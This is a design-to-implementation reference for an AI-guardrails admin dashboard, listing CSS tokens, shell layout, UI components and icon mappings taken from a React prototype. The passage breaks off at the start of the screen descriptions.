# Prototype Reference Map

> **Source of truth for implementation.** Every screen must be recreated pixel-faithfully from
> `docs/prototype/` (the vendored design). This document maps every design token, shell structure,
> component, and screen to its prototype source so implementers can open the exact files without
> guessing.
>
> The prototype is vanilla React (JSX) + CSS rendered via a CDN script tag — **do not copy the
> internal structure verbatim**. Recreate the *visual output* in the target stack (Tailwind v4
> tokens, lucide-react icons, TanStack Query, React Router).

---

## 1. Design Tokens

Two CSS files define the token set. The **primary token file** for this product is
`docs/prototype/app/styles.css` (the AI-guardrails-specific design system). The
`docs/prototype/styles.css` file is a *base dashboard shell template* with a partially-overlapping
token set — it is relevant for shell elements (scrollbar, chip, toast, drawer animation) but the
`app/styles.css` token names (`--color-*`) take precedence.

### 1.1 Dark theme (`:root, [data-theme="dark"]`) — from `app/styles.css`

These are the verbatim values to use in the Tailwind v4 `@theme` block:

```css
/* Backgrounds */
--color-bg:        #0b0f17;   /* page background */
--color-surface:   #111827;   /* panel / sidebar */
--color-surface-2: #161e2e;   /* inset row, active nav, chip */
--color-inset:     #080b12;   /* filter inputs, code blocks */

/* Borders */
--color-border:       #1f2937;
--color-border-strong: #334155;
--color-border-focus:  #5b8cff;

/* Foreground */
--color-fg:        #e5e9f0;   /* primary text */
--color-fg-muted:  #9aa6b8;   /* secondary text */
--color-fg-subtle: #5b6878;   /* tertiary / placeholders */

/* Accent (cyan — interactive elements, active nav) */
--color-accent:        #38bdf8;
--color-accent-strong: #0ea5e9;
--color-accent-bg:     rgba(56, 189, 248, 0.10);

/* Semantic colours */
--color-allow:   #34d399;   /* green — allowed, success, engaged */
--color-block:   #f87171;   /* red   — blocked, error, danger */
--color-warn:    #fbbf24;   /* amber — degraded, warning */
--color-pending: #a78bfa;   /* violet — pending approval */
--color-observe: #22d3ee;   /* cyan  — monitor/observe shadow mode */

/* Shadows */
--shadow-panel:  0 1px 2px rgba(0, 0, 0, 0.25);
--shadow-pop:    0 18px 48px -12px rgba(0, 0, 0, 0.65);
--shadow-drawer: -24px 0 60px -24px rgba(0, 0, 0, 0.7);

/* Radii */
--radius-ui:   10px;   /* panels, drawers, cards */
--radius-sm:   7px;    /* buttons, inputs, chips */
--radius-pill: 999px;  /* badges, toggles, live-dot */

/* Typography */
--font-sans: "Inter", ui-sans-serif, system-ui, -apple-system, sans-serif;
--font-mono: "JetBrains Mono", ui-monospace, "SF Mono", Menlo, monospace;

color-scheme: dark;
```

### 1.2 Light theme (`[data-theme="light"]`) — from `app/styles.css`

```css
/* Backgrounds */
--color-bg:        #f7f8fb;
--color-surface:   #ffffff;
--color-surface-2: #f1f5f9;
--color-inset:     #eef2f7;

/* Borders */
--color-border:        #e2e8f0;
--color-border-strong: #cbd5e1;
--color-border-focus:  #2563eb;

/* Foreground */
--color-fg:        #0f172a;
--color-fg-muted:  #475569;
--color-fg-subtle: #94a3b8;

/* Accent */
--color-accent:        #0284c7;
--color-accent-strong: #0369a1;
--color-accent-bg:     rgba(2, 132, 199, 0.08);

/* Semantic colours */
--color-allow:   #059669;
--color-block:   #dc2626;
--color-warn:    #d97706;
--color-pending: #7c3aed;
--color-observe: #0891b2;

/* Shadows */
--shadow-panel:  0 1px 2px rgba(15, 23, 42, 0.06);
--shadow-pop:    0 18px 48px -16px rgba(15, 23, 42, 0.22);
--shadow-drawer: -24px 0 60px -24px rgba(15, 23, 42, 0.25);

color-scheme: light;
```

### 1.3 Shell/Base tokens (from `docs/prototype/styles.css`)

These apply to the *shell template* layer only. Prefer `app/styles.css` tokens for the product.

| Token | Light value | Dark value |
|---|---|---|
| `--bg` | `#fafafa` | `#0a0a0b` |
| `--bg-elevated` | `#ffffff` | `#111113` |
| `--bg-subtle` | `#f4f4f5` | `#161618` |
| `--bg-hover` | `#f0f0f1` | `#1c1c1f` |
| `--bg-active` | `#e8e8ea` | `#232327` |
| `--border` | `#e7e7e9` | `#232327` |
| `--border-strong` | `#d4d4d8` | `#2e2e33` |
| `--text` | `#18181b` | `#f5f5f7` |
| `--text-secondary` | `#52525b` | `#a1a1a8` |
| `--text-tertiary` | `#8a8a93` | `#6e6e76` |
| `--accent` (shell) | `#0e9f6e` | `#10b981` |
| `--sidebar-w` | `232px` | (same) |
| `--topbar-h` | `48px` | (same) |
| `--row-h` | `40px` | (same) |
| `--row-h-tight` | `32px` | (same) |
| `--radius-xs` | `4px` | (same) |
| `--radius-sm` (shell) | `6px` | (same) |
| `--radius-md` | `8px` | (same) |
| `--font-sans` (shell) | `'Geist'` | (same) |
| `--font-mono` (shell) | `'Geist Mono'` | (same) |

> **Implementation note:** The product fonts are **Inter + JetBrains Mono** (from `app/styles.css`).
> The shell template uses Geist but the product overrides this. Use Inter/JetBrains in the final
> implementation.

---

## 2. Layout & Shell

**Source:** `docs/prototype/shell.jsx` (base template shell), `docs/prototype/app/styles.css`
(`.app`, `.sidebar`, `.brand`, `.nav`, `.topbar`, `.breadcrumb`, `.scroll-area`, `.page`).

### 2.1 Overall grid

```
.app  {  display: grid; grid-template-columns: 248px 1fr; height: 100vh; overflow: hidden; }
```

Left column: `.sidebar` (248 px wide, `background: var(--color-surface)`).
Right column: `.main` (flex column, `min-width: 0; overflow: hidden`).

### 2.2 Sidebar

Structure from top to bottom:

1. **Brand** (`.brand`) — `padding: 18px 18px 16px`, `border-bottom: 1px solid var(--color-border)`.
   - `.brand-mark` — 34×34px rounded-square (radius 9px), gradient
     `linear-gradient(150deg, var(--color-accent), var(--color-accent-strong))`, shield icon inside,
     box-shadow `0 0 0 1px rgba(56,189,248,0.35), 0 6px 18px -8px var(--color-accent)`.
   - `.brand-name` — `font-weight: 650; font-size: 14.5px; letter-spacing: -0.01em`.
     Text: **"AI Guardrails"**
   - `.brand-sub` — `font-size: 10.5px; color: var(--color-fg-subtle); text-transform: uppercase;
     letter-spacing: 0.08em; margin-top: 2px`. Text: **"admin"**

2. **Nav** (`.nav`) — `padding: 12px; overflow-y: auto; flex: 1`.

   **Group 1 — "CONTROLS"** (`.nav-label`):
   | Route | Label | Icon | Count badge |
   |---|---|---|---|
   | `/` | Overview | `dashboard` icon | — |
   | `/audit` | Injection Audit | `list` icon | injection attempt count |
   | `/firewall` | Tool Firewall | `shield` icon | rejection count |
   | `/output` | Output Handler | `filter` icon | — |

   **Group 2 — "OPS"** (`.nav-label`):
   | Route | Label | Icon | Count badge |
   |---|---|---|---|
   | `/approvals` | Approvals | `gavel` icon | pending count (red badge when > 0) |

   **Group 3 — "CONFIGURE"** (`.nav-label`):
   | Route | Label | Icon | Count badge |
   |---|---|---|---|
   | `/settings` | Settings | `settings` icon | — |
   | `/try` | Try · Sandbox | `flask` icon | — |

   Active nav item CSS (`.nav-item.active`):
   - `background: var(--color-accent-bg)` + `color: var(--color-accent)`
   - Left accent bar: `position: absolute; left: -12px; top/bottom: 7px; width: 3px;
     border-radius: 0 3px 3px 0; background: var(--color-accent)`

   Count badge (`.nav-count`):
   - Default: `background: var(--color-surface-2); color: var(--color-fg-muted);
     border-radius: 999px; padding: 1px 7px; border: 1px solid var(--color-border)`
   - Active item: `background: var(--color-accent); color: var(--color-bg); border-color: transparent`
   - Danger (pending approvals > 0): class `danger` →
     `background: color-mix(in srgb, var(--color-block) 18%, transparent); color: var(--color-block)`

3. **Sidebar footer** (`.sidebar-foot`) — `padding: 13px 16px; border-top: 1px solid var(--color-border); font-size: 11px; color: var(--color-fg-subtle)`.
   Displays package version: `"padosoft/laravel-ai-guardrails-admin"` + build version.
   `.sidebar-foot .suite` — `color: var(--color-fg-muted); font-weight: 500`.

### 2.3 Topbar

```
.topbar { height: 56px; flex: none; border-bottom: 1px solid var(--color-border);
  background: color-mix(in srgb, var(--color-bg) 82%, transparent);
  backdrop-filter: blur(8px); display: flex; align-items: center; gap: 14px; padding: 0 22px; }
```

Left: **Breadcrumb** (`.breadcrumb`) — `font-size: 13px; color: var(--color-fg-subtle)`.
Pattern: `AI Guardrails / <span class="here">Current Screen</span>`.
`.here` → `color: var(--color-fg); font-weight: 550`.
Separator: `/` (literal, styled as subtle).

Middle spacer: `flex: 1`.

Right controls (left → right):
1. **Live pill** (`.live-pill`) — shown on screens that poll live data (Dashboard, Audit, Approvals).
   Pill: `border: 1px solid var(--color-border); background: var(--color-surface); border-radius: 999px; padding: 4px 11px 4px 9px; font-size: 11.5px; font-weight: 600; color: var(--color-fg-muted)`.
   Animated dot `.live-dot` — 7×7px, `background: var(--color-allow)`, ring pulse animation (`ping` keyframes).
2. **Demo-state segmented** (`.segmented`) — Topbar in the product app (`app/app.jsx`) exposes
   a `DemoState` segmented control: **Data / Loading / Empty / Error** — used for every screen
   to preview all render states without a real backend.
3. **Theme toggle** — icon button cycling dark ↔ light, icon `sun`/`moon`.

### 2.4 Content area

```
.scroll-area { flex: 1; overflow-y: auto; min-height: 0; }
.page { max-width: 1180px; margin: 0 auto; padding: 26px 30px 60px; }
```

Every screen wraps content in `.page` and starts with a `.page-head`.

---

## 3. Component Inventory

**Source:** `docs/prototype/app/ui.jsx` (all primitives), `docs/prototype/app/charts.jsx` (charts),
`docs/prototype/app/icons.jsx` (icon set). CSS: `docs/prototype/app/styles.css`.

### 3.1 `Panel`

```jsx
<Panel pad>...</Panel>       // pad adds .panel-pad (padding: 16px)
<Panel>...</Panel>           // no padding (for table flush panels)
```

CSS: `.panel { background: var(--color-surface); border: 1px solid var(--color-border);
border-radius: var(--radius-ui); box-shadow: var(--shadow-panel); }`

Panel head: `.panel-head { padding: 13px 16px; border-bottom: 1px solid var(--color-border);
display: flex; align-items: center; gap: 12px; }`
`.panel-title { font-size: 13px; font-weight: 600; letter-spacing: 0.01em; }`
`.panel-head .sub { font-size: 12px; color: var(--color-fg-subtle); }`

### 3.2 `VerdictBadge`

Props: `kind` ("allowed"|"blocked"|"observed"|"too_long"|"warn"|"pending"), optional `label`, `dot` (bool, default true).

CSS class `.badge` + variant:
| kind | class | label | icon |
|---|---|---|---|
| allowed | `badge-allow` | ALLOWED | dot |
| blocked | `badge-block` | BLOCKED | dot |
| observed | `badge-observe` | OBSERVED | `eye` icon (not dot) |
| too_long | `badge-warn` | TOO LONG | dot |
| warn | `badge-warn` | DEGRADED | dot |
| pending | `badge-pending` | PENDING | dot |

Badge base CSS:
```css
.badge { display: inline-flex; align-items: center; gap: 5px; border-radius: var(--radius-pill);
  padding: 2px 9px 2px 7px; font-size: 10.5px; font-weight: 700; text-transform: uppercase;
  letter-spacing: 0.05em; white-space: nowrap; border: 1px solid transparent; }
.badge .bdot { width: 6px; height: 6px; border-radius: 999px; background: currentColor; }
.badge-allow   { color: var(--color-allow);   background: color-mix(in srgb, var(--color-allow) 14%, transparent); }
.badge-block   { color: var(--color-block);   background: color-mix(in srgb, var(--color-block) 15%, transparent); }
.badge-warn    { color: var(--color-warn);    background: color-mix(in srgb, var(--color-warn) 15%, transparent); }
.badge-pending { color: var(--color-pending); background: color-mix(in srgb, var(--color-pending) 16%, transparent); }
.badge-observe { color: var(--color-observe); background: color-mix(in srgb, var(--color-observe) 15%, transparent); }
.badge-neutral { color: var(--color-fg-muted); background: var(--color-surface-2); border-color: var(--color-border); }
.badge-accent  { color: var(--color-accent);  background: var(--color-accent-bg); }
```

### 3.3 `ModeSegmented`

Props: `mode` ("enforce"|"monitor"|"off"), `onChange(mode)`, optional `disabled`.

CSS `.mode-seg` — inline control with three buttons (Enforce / Monitor / Off).
Active button classes: `enforce` → accent `var(--color-allow)`, `monitor` → `var(--color-observe)`,
`off` → `var(--color-fg-muted)`.
Monitor button renders an `eye` icon (size 12) before its label.

```css
.mode-seg { display: inline-flex; background: var(--color-inset); border: 1px solid var(--color-border);
  border-radius: 8px; padding: 2px; gap: 2px; }
.mode-seg button { height: 28px; padding: 0 12px; border-radius: 6px; font-size: 12px;
  font-weight: 600; ... }
.mode-seg button.on[data-mode="enforce"] { color: var(--color-allow); }
.mode-seg button.on[data-mode="monitor"] { color: var(--color-observe); }
.mode-seg button.on[data-mode="off"]     { color: var(--color-fg-muted); }
```

### 3.4 `StatusDot`

Props: `status` ("engaged"|"monitor"|"degraded"|"disabled"), `live` (bool — adds pulsing ring).

```css
.status-dot { width: 9px; height: 9px; border-radius: 999px; flex: none; position: relative; }
.status-dot.engaged  { background: var(--color-allow);  box-shadow: 0 0 0 3px color-mix(in srgb, var(--color-allow) 18%, transparent); }
.status-dot.degraded { background: var(--color-warn);   box-shadow: 0 0 0 3px color-mix(in srgb, var(--color-warn) 18%, transparent); }
.status-dot.disabled { background: var(--color-fg-subtle); }
/* monitor = hollow eye-ringed dot */
.status-dot.monitor  { background: transparent; border: 2px solid var(--color-observe);
  box-shadow: 0 0 0 3px color-mix(in srgb, var(--color-observe) 16%, transparent); }
/* centre pin for monitor */
.status-dot.monitor::before { content: ""; position: absolute; inset: 50% auto auto 50%;
  width: 3px; height: 3px; border-radius: 999px; background: var(--color-observe);
  transform: translate(-50%, -50%); }
/* live ring animation (engaged or monitor) */
.status-dot.live.engaged::after { border-color: var(--color-allow); animation: ping 2s infinite; }
.status-dot.live.monitor::after { border-color: var(--color-observe); animation: ping 2s infinite; }
```

### 3.5 `Toggle`

Props: `on` (bool), `onChange(bool)`, `disabled`, optional `name` + `hint` (renders with label).

CSS: `width: 40px; height: 23px; border-radius: 999px`. Off state: `var(--color-border-strong)`.
On state: class `.on` → `background: var(--color-accent); border-color: var(--color-accent)`.
Thumb: white circle, `transform: translateX(17px)` when on.
Transition: `background 0.16s; transform 0.16s`.

### 3.6 `StatCard`

Props: `label` (string), `icon` (icon name), `value` (string|number), `delta` (text),
`deltaDir` ("up"|"down"|"flat"), `sub` (text).

Rendered as `<Panel className="stat-card">`:
- `.stat-label` — `font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.09em;
  color: var(--color-fg-muted); font-weight: 600` with icon.
- `.stat-value` — `font-size: 27px; font-weight: 680; letter-spacing: -0.02em; margin-top: 7px`.
  Variant `.sm` → `font-size: 21px`.
- `.stat-delta` — `font-size: 11.5px; font-weight: 600; margin-top: 6px`.
  `.up` → `color: var(--color-block)` (red, meaning "increased threats").
  `.down` → `color: var(--color-allow)` (green, meaning "decreased threats").
  `.flat` → `color: var(--color-fg-subtle)`.

### 3.7 `DataTable`

Props: `columns[]` (`{key, header, width?, align?, render(row)}`), `rows[]`, `onRowClick(row)`,
`rowKey` (default "id"), `empty` (node).

CSS `.data-table`:
- Header: `font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.07em;
  color: var(--color-fg-subtle); font-weight: 650; padding: 10px 14px; position: sticky; top: 0`.
- Body rows: `padding: 11px 14px`. Clickable rows add `cursor: pointer` and hover
  `background: var(--color-surface-2)`.
- `.cell-prompt` — monospace truncated excerpt, `max-width: 360px; overflow: hidden;
  text-overflow: ellipsis; white-space: nowrap; color: var(--color-fg-muted); font-family: var(--font-mono)`.
- `.cell-mono` — `font-family: var(--font-mono); font-size: 12px`.
- `.cell-muted` — `color: var(--color-fg-muted)`.
- `.cell-when` — `color: var(--color-fg-subtle); white-space: nowrap; font-size: 12.5px`.
- `.row-arrow` — `color: var(--color-fg-subtle)` → `var(--color-accent)` on row hover.

### 3.8 `Drawer`

Props: `title` (string), `sub` (string), `badge` (node), `onClose()`, `children`, `footer` (node).

Behaviour: ESC closes; click `.scrim` closes; focus-trapped; auto-focuses first focusable child.

CSS:
```css
.scrim  { position: fixed; inset: 0; background: rgba(3, 6, 12, 0.55);
  backdrop-filter: blur(2px); z-index: 200; animation: fade 0.16s ease; }
.drawer { position: fixed; top: 0; right: 0; bottom: 0; width: min(540px, 92vw);
  background: var(--color-surface); border-left: 1px solid var(--color-border);
  box-shadow: var(--shadow-drawer); z-index: 201; display: flex; flex-direction: column;
  animation: slidein 0.22s cubic-bezier(0.16, 1, 0.3, 1); }
@keyframes slidein { from { transform: translateX(28px); opacity: 0.4; } to { transform: translateX(0); opacity: 1; } }
.drawer-head { padding: 16px 18px; border-bottom: 1px solid var(--color-border);
  display: flex; align-items: flex-start; gap: 12px; }
.drawer-head .dh-title { font-size: 15px; font-weight: 650; }
.drawer-head .dh-sub   { font-size: 12px; color: var(--color-fg-subtle); margin-top: 3px; }
.drawer-body { padding: 18px; overflow-y: auto; flex: 1; min-height: 0; }
.drawer-foot { padding: 14px 18px; border-top: 1px solid var(--color-border); display: flex; gap: 10px; }
```

### 3.9 `Toggle` (label variant)

When `name` prop provided → wraps in `.toggle-row` (flex, gap 12px). Then `.toggle-label`:
- `.tl-name` — `font-size: 13.5px; font-weight: 550`.
- `.tl-hint` — `font-size: 11.5px; color: var(--color-fg-subtle)`.

### 3.10 `Chips`

Props: `values[]`, `onRemove(v)`, `onAdd()`, `addLabel` (default "Add key").

CSS `.chips { display: flex; flex-wrap: wrap; gap: 7px; align-items: center; }`.
Each `.chip`: `display: inline-flex; align-items: center; gap: 6px; height: 27px;
padding: 0 4px 0 10px; border-radius: 7px; background: var(--color-surface-2);
border: 1px solid var(--color-border); font-family: var(--font-mono); font-size: 12px`.
Remove button `width: 19px; height: 19px`; hover → `color: var(--color-block)`.
Add button `.chip-add`: dashed border, `border: 1px dashed var(--color-border-strong)`;
hover → `color: var(--color-accent); border-color: var(--color-accent)`.

### 3.11 `CodeBlock`

Props: `children` (content).

CSS `.code-block { font-family: var(--font-mono); font-size: 12.5px; line-height: 1.6;
background: var(--color-inset); border: 1px solid var(--color-border); border-radius: 9px;
padding: 12px 14px; white-space: pre-wrap; word-break: break-word; color: var(--color-fg); }`.

### 3.12 `PromptExcerpt`

Props: `text` (string), `match` ([startIdx, endIdx] or null).

Renders as `.code-block.prompt-excerpt`. When `match` present, wraps the matched slice in
`<mark>` — CSS: `background: color-mix(in srgb, var(--color-block) 30%, transparent);
color: var(--color-fg); border-radius: 3px; padding: 1px 2px;
box-shadow: 0 0 0 1px color-mix(in srgb, var(--color-block) 50%, transparent); font-weight: 600`.

### 3.13 `PromptPrivacy`

Props: `storage` ("hash"|"redact"|"truncate"), `hash` (string), `length` (number).

Renders a `.privacy-panel` (dashed border, cyan-tinted background) with:
- Icon box (hash → `hash` icon; else `eyeOff` icon).
- Title: `"Prompt stored as {word} for privacy"`.
- Hint text explains the storage mode.
- Optional hash display + char count.

CSS:
```css
.privacy-panel { border: 1px dashed var(--color-border-strong);
  background: color-mix(in srgb, var(--color-observe) 6%, var(--color-inset));
  border-radius: 9px; padding: 14px; display: flex; gap: 12px; align-items: flex-start; }
.privacy-panel .pp-icon { width: 30px; height: 30px; border-radius: 8px; display: grid;
  place-items: center; background: color-mix(in srgb, var(--color-observe) 14%, transparent);
  color: var(--color-observe); flex: none; }
.privacy-panel .pp-hash { font-family: var(--font-mono); font-size: 11.5px;
  color: var(--color-fg-subtle); margin-top: 8px; word-break: break-all; }
```

### 3.14 `KV` (key-value list)

Props: `items` (array of [key, value] pairs).

CSS `.kv { display: grid; grid-template-columns: 130px 1fr; gap: 7px 14px; font-size: 13px; }`.
`dt` → `color: var(--color-fg-subtle); font-size: 12px`.
`dd` → `font-family: var(--font-mono); font-size: 12.5px; word-break: break-word; margin: 0`.

### 3.15 `SearchInput`

Props: `value`, `onChange(v)`, `placeholder`.

Renders `.input-search` (position: relative) with search icon (absolute, left: 10px, subtle color)
and `.input` with `padding-left: 31px; min-width: 230px`.

### 3.16 `SectionLabel`

Props: `children` (label text), `right` (node, optional — right-side element like `ModeSegmented`).

CSS: `display: flex; align-items: center; justify-content: space-between; margin: 22px 0 11px`.
`.section-label { font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.1em;
  color: var(--color-fg-subtle); font-weight: 650; }`.

### 3.17 `Banner`

Props: `kind` ("warn"|"info"), `icon` (icon name), `children`.

Warn banner: border + bg tinted amber. Info banner: class `.info` → cyan tinted.

```css
.banner { display: flex; align-items: center; gap: 12px; padding: 12px 15px;
  border-radius: var(--radius-ui); border: 1px solid color-mix(in srgb, var(--color-warn) 38%, transparent);
  background: color-mix(in srgb, var(--color-warn) 9%, transparent); font-size: 13px; }
.banner.info { border-color: color-mix(in srgb, var(--color-accent) 35%, transparent);
  background: var(--color-accent-bg); }
.banner .bn-icon { color: var(--color-warn); flex: none; }
.banner.info .bn-icon { color: var(--color-accent); }
.banner .bn-text b { font-weight: 650; }
```

### 3.18 `EmptyState`

Props: `title`, `msg`, `icon` (default "inbox"), `positive` (bool — green icon), `action` (node).

CSS `.state-box { display: flex; flex-direction: column; align-items: center; justify-content: center;
  text-align: center; padding: 52px 24px; gap: 12px; }`.
`.state-icon { width: 46px; height: 46px; border-radius: 12px; background: var(--color-surface-2); }`.
`.state-title { font-size: 14.5px; font-weight: 600; }`.
`.state-msg { font-size: 13px; color: var(--color-fg-muted); max-width: 42ch; }`.

Positive variant: icon = `check`, `color: var(--color-allow)`.

### 3.19 `ErrorState`

Props: `kind` ("unavailable"|"invalid"|"error"), `onRetry()`.

| kind | title | message |
|---|---|---|
| unavailable | The guardrails core is unreachable | Check that the core package is installed and the API is enabled. |
| invalid | Schema version mismatch | The core returned a payload this admin build doesn't understand. Update the admin or the core. |
| error | Something went wrong | An unexpected error occurred while loading this data. |

Renders `.state-box.error` with `alert` icon + optional Retry button.

### 3.20 `LoadingRows` / `SkeletonCard`

`LoadingRows({ rows = 5, cols = 4 })` — shimmer skeleton rows matching table structure.
`SkeletonCard({ h = 96 })` — skeleton card matching StatCard dimensions.
CSS `.skeleton { background: shimmer gradient; animation: shimmer 1.3s ease-in-out infinite; border-radius: 6px; }`.

### 3.21 `ToastHost` / `useToasts`

`useToasts()` returns `{ toasts, push(msg, kind) }`. `kind` = "ok"|"block".
`ToastHost({ toasts })` renders `.toast-wrap` (fixed bottom-right) with toast items.

Toast CSS:
```css
.toast { display: flex; align-items: center; gap: 10px; background: var(--color-surface);
  border: 1px solid var(--color-border-strong); border-radius: 10px; padding: 11px 14px;
  box-shadow: var(--shadow-pop); font-size: 13px; min-width: 250px; animation: slidein 0.22s; }
.toast.ok    .tk-icon { color: var(--color-allow); }
.toast.block .tk-icon { color: var(--color-block); }
```

### 3.22 Sticky SaveBar

Not a separate component — inline `<div className="sticky-save">` when `dirty === true`.

```css
.sticky-save { position: sticky; bottom: 0; margin-top: 18px; padding: 13px 16px;
  background: color-mix(in srgb, var(--color-surface) 92%, transparent);
  backdrop-filter: blur(8px); border: 1px solid var(--color-border);
  border-radius: var(--radius-ui); display: flex; align-items: center; gap: 14px;
  box-shadow: var(--shadow-pop); }
```

Contains: info icon, `<span class="grow">` message, Discard button (`btn btn-sm btn-ghost`),
Save button (`btn btn-sm btn-primary`).

### 3.23 Buttons

Base `.btn { display: inline-flex; align-items: center; justify-content: center; gap: 7px;
height: 34px; padding: 0 13px; border-radius: 8px; font-size: 13px; font-weight: 550;
border: 1px solid var(--color-border-strong); background: var(--color-surface-2); }`.

Variants:
- `.btn-sm` — `height: 29px; padding: 0 10px; font-size: 12px`
- `.btn-icon` — `width: 34px; padding: 0`
- `.btn-ghost` — `background: transparent; border-color: transparent; color: var(--color-fg-muted)`
- `.btn-primary` — `background: var(--color-accent); border-color: transparent; color: #04121d; font-weight: 650`
  (light theme: `color: #fff`)
- `.btn-allow` — green tinted border + text, `background: color-mix(in srgb, var(--color-allow) 16%, transparent)`
- `.btn-block` — red tinted border + text, `background: color-mix(in srgb, var(--color-block) 14%, transparent)`

### 3.24 Inputs / Selects

```css
.input, .select { height: 32px; border-radius: 8px; border: 1px solid var(--color-border);
  background: var(--color-inset); color: var(--color-fg); padding: 0 11px; font-size: 13px; }
.input:focus, .select:focus { border-color: var(--color-border-focus); outline: none; }
textarea.input { height: auto; padding: 10px 12px; resize: vertical; line-height: 1.55; }
```

### 3.25 Filter bar

```css
.filter-bar { display: flex; align-items: center; gap: 9px; flex-wrap: wrap;
  padding: 12px 14px; border-bottom: 1px solid var(--color-border); }
```

### 3.26 Charts — `Sparkline`

Source: `docs/prototype/app/charts.jsx`, function `Sparkline` (lines 13–39).

Props: `data` (number[]), `color` (CSS var, default `var(--color-accent)`), `height` (default 34),
`fill` (bool default true).

Renders an inline SVG (class `.spark`, `width: 100%; height: 34px; display: block`).
Line: stroke `color`, `strokeWidth: 1.6`, `strokeLinejoin: round`.
Fill: linear gradient from `color` at 28% opacity to 0% at bottom.

### 3.27 Charts — `StackedAreaChart`

Source: `docs/prototype/app/charts.jsx`, function `StackedAreaChart` (lines 43–121).

Props: `points` (array of `{at, allowed, observed, blocked}`), `height` (default 210).

Renders three stacked bands:
1. Allowed — `var(--color-allow)` (bottom, largest, gradient fill).
2. Observed — `var(--color-observe)` (middle, shadow-mode would-block).
3. Blocked — `var(--color-block)` (top, eye drawn to threats).

Grid lines at 0, max/2, max. X labels (date strings). End dots on last point.
ARIA: `role="img" aria-label="Injection throughput..."`.

### 3.28 Charts — `BarBreakdown`

Source: `docs/prototype/app/charts.jsx`, function `BarBreakdown` (lines 125–140).

Props: `items` (array of `{label, value, color?}`), `color` (default `var(--color-accent)`).

Renders horizontal bar rows (`.bar-row`): label (92px, monospace) + track (flex:1, rounded, 9px
tall) + numeric value (56px, right-aligned, tabular nums).

### 3.29 Icon System

Source: `docs/prototype/app/icons.jsx`.

Usage: `<Icon name="shield" size={16} />` — renders SVG with `viewBox="0 0 24 24"`, stroke-only,
`strokeWidth: 2`, `strokeLinecap: round`, `strokeLinejoin: round`.

Available icons (name → path data):
`shield`, `scan`, `filter`, `gavel`, `dashboard`, `list`, `settings`, `flask`, `search`, `x`,
`check`, `chevronRight`, `chevronDown`, `sun`, `moon`, `alert`, `info`, `inbox`, `refresh`,
`plus`, `bolt`, `clock`, `user`, `eye`, `code`, `db`, `lock`, `eyeOff`, `hash`, `history`,
`wand`.

**Implementation note:** Replace with `lucide-react` equivalents — mappings:
`shield`→`Shield`, `scan`→`ScanLine`, `filter`→`Filter`, `gavel`→`Gavel`,
`dashboard`→`LayoutDashboard`, `list`→`List`, `settings`→`Settings`, `flask`→`FlaskConical`,
`search`→`Search`, `x`→`X`, `check`→`Check`, `chevronRight`→`ChevronRight`,
`chevronDown`→`ChevronDown`, `sun`→`Sun`, `moon`→`Moon`, `alert`→`AlertTriangle`,
`info`→`Info`, `inbox`→`Inbox`, `refresh`→`RefreshCw`, `plus`→`Plus`, `bolt`→`Zap`,
`clock`→`Clock`, `user`→`User`, `eye`→`Eye`, `code`→`Code2`, `db`→`Database`,
`lock`→`Lock`, `eyeOff`→`EyeOff`, `hash`→`Hash`, `history`→`History`, `wand`→`Wand2`.

### 3.30 Control Health Card (Dashboard)

Source: `docs/prototype/app/styles.css` (`.control-card`, `.controls-grid`, lines 685–766).

CSS:
```css
.controls-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; }
.control-card { padding: 15px; display: flex; flex-direction: column; gap: 12px;
  text-align: left; width: 100%; border: 1px solid var(--color-border); position: relative;
  overflow: hidden; transition: border-color 0.15s, transform 0.15s, box-shadow 0.15s; }
.control-card:hover { border-color: var(--color-border-strong); transform: translateY(-2px);
  box-shadow: var(--shadow-pop); }
/* top accent bar (2px, full width) */
.control-card::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
.control-card.s-engaged::before  { background: var(--color-allow); }
.control-card.s-monitor::before  { background: var(--color-observe); }
.control-card.s-degraded::before { background: var(--color-warn); }
.control-card.s-disabled::before { background: var(--color-fg-subtle); }
```

Card structure:
1. `.cc-top` (flex, space-between): left side has `CONTROL {letter}` mono label + `.cc-name`; right has `.cc-icon` (32×32px icon box).
2. `.cc-status` (flex, items-center, gap 7px, text uppercase 11px font-weight 700):
   `StatusDot` + status text (ENFORCE / MONITOR / FALLBACK / OFF). Color by status class:
   `.engaged` → `var(--color-allow)`, `.monitor` → `var(--color-observe)`, `.degraded` → `var(--color-warn)`, `.disabled` → `var(--color-fg-subtle)`.
3. `.cc-posture` — `font-size: 12px; color: var(--color-fg-muted); line-height: 1.4` — posture text.
4. `.cc-spark` (`margin-top: auto`) — `Sparkline` chart.

### 3.31 Norm-rule / Diff-grid (Try sandbox)

CSS:
```css
.norm-rule { display: inline-flex; align-items: center; gap: 5px; height: 24px; padding: 0 9px;
  border-radius: 6px; background: var(--color-surface-2); border: 1px solid var(--color-border);
  font-family: var(--font-mono); font-size: 11.5px; color: var(--color-fg-muted); }
.norm-rule .nr-dot { width: 5px; height: 5px; border-radius: 999px; background: var(--color-observe); }

.diff-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
.diff-col .diff-head { font-size: 10.5px; text-transform: uppercase; letter-spacing: 0.08em;
  font-weight: 650; color: var(--color-fg-subtle); margin-bottom: 6px; }
.diff-body { font-family: var(--font-mono); font-size: 12.5px; line-height: 1.7;
  background: var(--color-inset); border: 1px solid var(--color-border); border-radius: 9px;
  padding: 11px 13px; white-space: pre-wrap; }
/* glyph highlights */
.glyph-zw   { background: color-mix(in srgb, var(--color-block) 26%, transparent);
  box-shadow: 0 0 0 1px color-mix(in srgb, var(--color-block) 50%, transparent); }
.glyph-homo { background: color-mix(in srgb, var(--color-warn) 28%, transparent);
  box-shadow: 0 0 0 1px color-mix(in srgb, var(--color-warn) 55%, transparent); }
.glyph-fix  { background: color-mix(in srgb, var(--color-allow) 24%, transparent); }
```

### 3.32 `StatusDot` variants for control cards

| mode/status | StatusDot status | live? |
|---|---|---|
| enforce, status: engaged | engaged | true |
| monitor, status: monitor | monitor | true |
| enforce, status: degraded | degraded | false |
| off, status: disabled | disabled | false |

---

## 4. The 8 Screens

### 4.1 Dashboard (`/`)

**Source:** `docs/prototype/app/pages-core.jsx` → function `Dashboard` (lines 49–140).
**Data shape:** `MOCK.controls[]`, `MOCK.totals`, `MOCK.trend[]`.

#### Layout

```
PageHead (icon="shield", title="Guardrail Health")
  actions: <select range> + <LivePill>

[Loading state: 4 SkeletonCards]
[Empty state: Panel + EmptyState("No activity yet")]

